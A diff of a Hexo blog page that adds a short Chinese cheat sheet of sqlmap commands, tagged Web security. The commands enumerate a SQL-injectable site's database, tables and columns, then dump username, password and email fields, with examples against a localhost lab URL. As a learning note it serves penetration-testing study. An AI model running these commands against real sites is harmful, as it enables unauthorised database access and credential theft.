@@ -102,17 +102,21 @@
 
 
   
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="Web security," />
 
 
+<meta name="description" content="0x01 查看当前数据库，得到数据库名字sqlmap.py -u “存在注入url” –current-db python sqlmap.py -u “http://127.0.0.1:65412/?id=2“ –current-db 0x02 查看tables,得到指定数据库的表名字python sqlmap.py -u “存在注入url” -D “当前数据库名” –tables   //解释说">
+<meta name="keywords" content="Web security">
 <meta property="og:type" content="article">
 <meta property="og:title" content="经典sqlmap命令">
 <meta property="og:url" content="http://yoursite.com/2018/03/09/经典sqlmap命令/index.html">
 <meta property="og:site_name" content="Rick7dology">
+<meta property="og:description" content="0x01 查看当前数据库，得到数据库名字sqlmap.py -u “存在注入url” –current-db python sqlmap.py -u “http://127.0.0.1:65412/?id=2“ –current-db 0x02 查看tables,得到指定数据库的表名字python sqlmap.py -u “存在注入url” -D “当前数据库名” –tables   //解释说">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-03-09T07:33:21.147Z">
+<meta property="og:updated_time" content="2018-03-09T10:07:51.195Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="经典sqlmap命令">
+<meta name="twitter:description" content="0x01 查看当前数据库，得到数据库名字sqlmap.py -u “存在注入url” –current-db python sqlmap.py -u “http://127.0.0.1:65412/?id=2“ –current-db 0x02 查看tables,得到指定数据库的表名字python sqlmap.py -u “存在注入url” -D “当前数据库名” –tables   //解释说">
 
 
 
@@ -326,7 +330,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article&#58;</span>
                 
-                <span title="Symbols count in article">0</span>
+                <span title="Symbols count in article">649</span>
               
 
               
@@ -360,7 +364,15 @@
       
 
       
-        
+        <h1 id="0x01-查看当前数据库，得到数据库名字"><a href="#0x01-查看当前数据库，得到数据库名字" class="headerlink" title="0x01 查看当前数据库，得到数据库名字"></a>0x01 查看当前数据库，得到数据库名字</h1><p>sqlmap.py -u “存在注入url” –current-db</p>
+<p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ –current-db</p>
+<h1 id="0x02-查看tables-得到指定数据库的表名字"><a href="#0x02-查看tables-得到指定数据库的表名字" class="headerlink" title="0x02 查看tables,得到指定数据库的表名字"></a>0x02 查看tables,得到指定数据库的表名字</h1><p>python sqlmap.py -u “存在注入url” -D “当前数据库名” –tables   //解释说明：-D是指定数据库名称</p>
+<p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ –tables</p>
+<h1 id="0x03-查看columns，得到指定数据库，指定表的列名字"><a href="#0x03-查看columns，得到指定数据库，指定表的列名字" class="headerlink" title="0x03 查看columns，得到指定数据库，指定表的列名字"></a>0x03 查看columns，得到指定数据库，指定表的列名字</h1><p>sqlmap.py -u “存在注入url” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” –columns</p>
+<p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ -T “users” –columns</p>
+<h1 id="0x04-根据上面得到的columns查看具体字段"><a href="#0x04-根据上面得到的columns查看具体字段" class="headerlink" title="0x04 根据上面得到的columns查看具体字段"></a>0x04 根据上面得到的columns查看具体字段</h1><p>sqlmap.py -u “存在注入url ” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” -C “username,password,email” –dump</p>
+<p>python sqlmap.py -u “<a href="http://127.0.0.1:65412/?id=2" target="_blank" rel="noopener">http://127.0.0.1:65412/?id=2</a>“ -T “users” -C “password” –dump</p>
+
       
     </div>
     
@@ -374,6 +386,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web-security/" rel="tag"># Web security</a>
+          
+        </div>
       
 
       
@@ -441,8 +459,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -507,6 +534,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-查看当前数据库，得到数据库名字"><span class="nav-number">1.</span> <span class="nav-text">0x01 查看当前数据库，得到数据库名字</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-查看tables-得到指定数据库的表名字"><span class="nav-number">2.</span> <span class="nav-text">0x02 查看tables,得到指定数据库的表名字</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-查看columns，得到指定数据库，指定表的列名字"><span class="nav-number">3.</span> <span class="nav-text">0x03 查看columns，得到指定数据库，指定表的列名字</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-根据上面得到的columns查看具体字段"><span class="nav-number">4.</span> <span class="nav-text">0x04 根据上面得到的columns查看具体字段</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
